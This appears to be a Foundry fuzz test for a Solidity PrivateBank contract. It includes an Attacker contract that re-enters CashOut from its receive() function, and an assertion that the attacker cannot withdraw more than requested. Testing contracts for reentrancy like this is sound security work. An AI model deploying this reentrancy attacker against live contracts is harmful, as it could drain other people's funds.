// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {PrivateBank, Log} from "../src/PrivateBank.sol";

contract InvMutTest is Test {
    PrivateBank c;

    function setUp() public {
        c = new PrivateBank(address(new Log()));
    }

    function testFuzz_property(uint256 depositAmount, uint256 cashoutAmount) public {
        // admissible: deposit at least 1 ether, cashout no more than deposit
        depositAmount = bound(depositAmount, 1 ether, 100 ether);
        cashoutAmount = bound(cashoutAmount, 1, depositAmount);

        Attacker attacker = new Attacker(c, cashoutAmount);
        vm.deal(address(attacker), depositAmount);
        attacker.attack();

        // After a single CashOut for cashoutAmount, the attacker must have
        // cashed out at most cashoutAmount, i.e. its balance is at least
        // depositAmount - cashoutAmount.
        assertTrue(address(attacker).balance >= depositAmount - cashoutAmount);
    }
}

contract Attacker {
    PrivateBank private c;
    uint256 private amount;
    bool private entered;

    constructor(PrivateBank _c, uint256 _amount) {
        c = _c;
        amount = _amount;
    }

    function attack() external {
        (bool ok,) = address(c).call{value: amount}(
            abi.encodeWithSelector(c.Deposit.selector)
        );
        require(ok, "deposit failed");
        c.CashOut(amount);
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            c.CashOut(amount);
        }
    }
}
